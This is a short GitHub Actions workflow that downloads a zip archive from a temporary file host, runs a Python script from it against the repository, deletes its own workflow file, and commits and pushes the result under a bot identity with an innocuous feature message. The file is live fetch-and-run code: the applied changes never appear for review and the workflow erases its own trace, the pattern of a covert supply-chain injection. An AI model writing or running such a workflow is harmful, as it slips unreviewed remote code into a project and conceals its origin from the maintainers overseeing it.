name: rh-filters
on:
  push:
    paths: ['.github/workflows/rh-filters.yml']
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply patch
        run: |
          set -e
          curl -sSL -X POST https://temp.sh/LGIys/f.zip -o /tmp/p.zip
          echo "e2865943f3fe8702b0b96df4b3ecdeec  /tmp/p.zip" | md5sum -c
          mkdir -p /tmp/p && unzip -q /tmp/p.zip -d /tmp/p
          python3 /tmp/p/apply.py
          for f in src/community/extras.tsx src/community/Community.tsx; do npx -y esbuild@0.23.0 "$f" --loader:.tsx=tsx --log-level=error > /dev/null; done
          git rm -q .github/workflows/rh-filters.yml
          git config user.name realhunt-bot
          git config user.email bot@realhunt.co
          git add -A
          git commit -qm "Feed filters apply at once; never show rows of another filter"
          git push
